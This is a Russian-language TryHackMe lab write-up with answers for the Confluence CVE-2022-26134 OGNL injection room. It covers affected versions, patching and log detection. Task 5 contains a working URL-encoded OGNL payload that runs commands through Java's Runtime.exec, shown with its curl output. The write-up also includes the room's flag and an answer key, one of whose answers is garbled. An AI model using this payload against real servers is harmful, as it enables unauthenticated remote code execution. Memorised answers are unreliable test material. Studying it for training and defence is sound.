[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Atlassian CVE-2022-26134](https://tryhackme.com/r/room/cve202226134) 

Всего 6 заданий:
## Задание 1
30 мая 2022 года организация Volexity обнаружила неаутентифицированную уязвимость RCE (оценка NIST 9,8) в выпусках 
Confluence Server и Data Center компании Atlassian . 

Confluence — это совместная документация и фреймворк управления проектами для команд.  Confluence помогает 
отслеживать статус проекта, предлагая централизованное рабочее пространство для участников. 

Следующие версии Confluence уязвимы к этой CVE :
- 1.3.0 -> 7.4.17
- 7.13.0 -> 7.13.7
- 7.14.0 -> 7.14.3 
- 7.15.0 -> 7.15.2 
- 7.16.0 -> 7.16.4
- 7.17.0 -> 7.17.4
- 7.18.0 -> 7.18.1 
Ознакомиться с записью NIST для CVE-2022-26134 можно здесь .

### Ответьте на вопросы ниже
Какова полная запись CVE для этого эксплойта?
```commandline
CVE-2022-26134
```
Вы обнаружили сервер, работающий под управлением Confluence с версией 7.16.2 , уязвим ли он? 
Формат ответа : да/нет

```commandline
yay
```

## Задание 2
Теперь пришло время попрактиковаться в этой уязвимости! Разверните машину, прикрепленную к этой задаче, и создайте различные полезные нагрузки, чтобы ответить на вопросы ниже.

Примечание: Пожалуйста, подождите не менее семи минут, пока эта машина запустится, прежде чем атаковать . Вы можете убедиться, что машина готова к атаке, как только загрузится страница входа по следующему URL:  HTTP ://MACHINE_IP:8090 . Тем временем продолжайте выполнять остальные задачи.

Скриншот, на котором показаны два текстовых поля для ввода имени пользователя и пароля на веб-панели входа в Confluence.

Панель входа в Confluence по  HTTP ://MACHINE_IP:8090 .

### Ответьте на вопросы ниже
Разверните машину, прикрепленную к этой задаче, нажав зеленую кнопку с надписью «Запустить машину», и приступайте к выполнению задач.
```commandline
Ответ не требуется
```

## Задание 3
Эта CVE использует уязвимость в языке выражений OGNL (Object-Graph Navigation Language) для Java (сюрприз, сюрприз... это Java). OGNL используется для получения и установки свойств объектов Java, среди прочего.

Например, OGNL используется для привязки элементов front-end, таких как текстовые поля, к back-end объектам и может использоваться в веб-приложениях на основе Java, таких как Confluence. Мы можем увидеть, как используется OGNL, на снимке экрана ниже. Значения вводятся в веб-форму, где эти значения будут сохранены в объектах внутри приложения:

Веб-страница с вопросами и полем ввода текста справа от каждого вопроса, демонстрирующая, как значения, введенные в веб-форму, могут быть сохранены в бэкэнде с помощью OGNL

Благодарим Journaldev.com за этот пример использования OGNL .


Мы можем воспользоваться тем фактом, что OGNL можно модифицировать; мы можем создать полезную нагрузку для тестирования и проверки на наличие эксплойтов.

### Ответьте на вопросы ниже
Что означает аббревиатура OGNL?
```commandline
Object-Graph Navigation Language
```

## Задание 4
Исправление

Atlassian выпустила рекомендации для своих продуктов, затронутых этой CVE, с которыми вы можете ознакомиться здесь . Чтобы решить проблему, вам необходимо обновить версию Confluence. Предлагаемый список на момент публикации:

7.4.17
7.13.7
7.14.3
7.15.2
7.16.4
7.17.4
7.18.1
Обнаружение - Файлы журналов

Confluence — это сервер Apache Tomcat, логи которого находятся в  /opt/atlassian/confluence/logs. Вы можете использовать такие команды, как grep, для поиска HTTP- запросов GET полезных нагрузок, которые используют среду выполнения Java для выполнения команд. Например:

grep -R "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22"в catalina.out
Обнаружение - ЯРА

Если на сервере, на котором работает Confluence, установлена ​​Yara, компания Volexity (нашедшие уязвимость) создала для вас следующее правило Yara, расположенное здесь .

Не знакомы с Yara? Посетите нашу комнату Yara здесь .

### Ответьте на вопросы ниже
Я обновил свою уязвимую установку!
```commandline
Ответ не нужен
```

## Задание 5
Мы можем воспользоваться тем фактом, что OGNL можно модифицировать; мы можем создать полезную нагрузку для тестирования и проверки на наличие эксплойтов.

Чтобы воспользоваться этой уязвимостью в OGNL , нам нужно сделать запрос HTTP GET и поместить нашу полезную нагрузку в URI . Например, мы можем поручить среде выполнения Java выполнить команду, например, создать файл на сервере:  ${@java.lang.Runtime@getRuntime().exec("touch /tmp/thm/")}/  .

Это должно быть URL-кодировано, как в следующем фрагменте ниже. Вы можете использовать этот веб-сайт, чтобы помочь URL-кодировать ваши полезные данные ( обратите внимание , что ваши curl полезные данные должны заканчиваться на завершающий символ /, а не на $2F):

Создание временного файла на сервере для доказательства уязвимости
cmnatic@thm-cve-2022-26134:~$ curl -v http://localhost:8090/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/thm%22%29%7D/
*   Trying 127.0.0.1:8090...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8090 (#0)
> GET /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/thm%22%29%7D/ HTTP/1.1
> Host: localhost:8090
> User-Agent: curl/7.68.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 302
< X-ASEN: SEN-L18512764
< X-Confluence-Request-Time: 1656845716316
< Set-Cookie: JSESSIONID=761E9FA42B315225C0B84B0BAC92B2B3; Path=/; HttpOnly
< X-XSS-Protection: 1; mode=block
< X-Content-Type-Options: nosniff
< X-Frame-Options: SAMEORIGIN
< Content-Security-Policy: frame-ancestors 'self'
< Location: /login.action?os_destination=%2F%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch+%2Ftmp%2Fthm%22%29%7D%2Findex.action&permissionViolation=true
< Content-Type: text/html;charset=UTF-8
< Content-Length: 0
< Date: Sun, 03 Jul 2022 10:55:17 GMT
<
* Connection #0 to host localhost left intact
cmnatic@thm-cve-2022-26134:~$

Глядя на сервер, мы видим, что он уязвим:

Создание временного файла на сервере для доказательства уязвимости
cmnatic@thm-cve-2022-26134:~$ ls /tmp
hsperfdata_confluence
thm
snap.lxd

Питон
Есть несколько работающих PoC-эксплойтов. В этой комнате я продемонстрирую PoC Сэми Юнси (Mwqda), написанный на Python и размещенный на GitHub .

Пошаговое руководство (Нажмите, чтобы прочитать)
### Ответьте на вопросы ниже
Загрузите доказательство концепции для этой задачи! Если вы используете AttackBox, это уже сделано для вас, его можно найти в /root/Rooms/CVE2022-26134.
```commandline
Ответ не нужен
```
Прежде чем продолжить , убедитесь, что панель входа по адресу HTTP://MACHINE_IP:8090  загружена.
```commandline
Ответ не нужен
```
Создайте полезную нагрузку для определения того, под каким пользователем запущено приложение. Что такое пользователь?
```commandline
confluence
```
Наконец, создайте полезную нагрузку для извлечения флага, хранящегося в /flag.txt на MACHINE_IP. Что такое флаг?
```commandline
THM{OGNL_VULN}
```

## Задание 6
Отличная работа!

Надеюсь, вам понравилась эта краткая демонстрация уязвимости CVE -2022-26134 OGNL Injection. Помните, OGNL — это 
язык выражений для веб-приложений на основе Java, поэтому эта уязвимость будет также применяться к другим 
веб-приложениям, работающим с теми же классами, которые использует Confluence!  

Ознакомьтесь с нашим  модулем «Недавние угрозы»

Дополнительные материалы для чтения:
- Запись в Национальной базе данных уязвимостей NIST ( CVE -2022-26134)
- Охота за Confluence RCE [ CVE -2022–26134]
- Исследование и устранение последствий слияния RCE
- Что такое инъекция OGNL ?
- Citrix: Руководство по сокращению неаутентифицированных OGNL- инъекций RCE
- Изучение внедрения OGNL в Apache Struts

Ответьте на последний вопрос, чтобы закончить эту комнату.

### Ответьте на вопросы ниже
Завершите работу виртуальной машины, подключенной к этой комнате, чтобы завершить ее работу.

```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)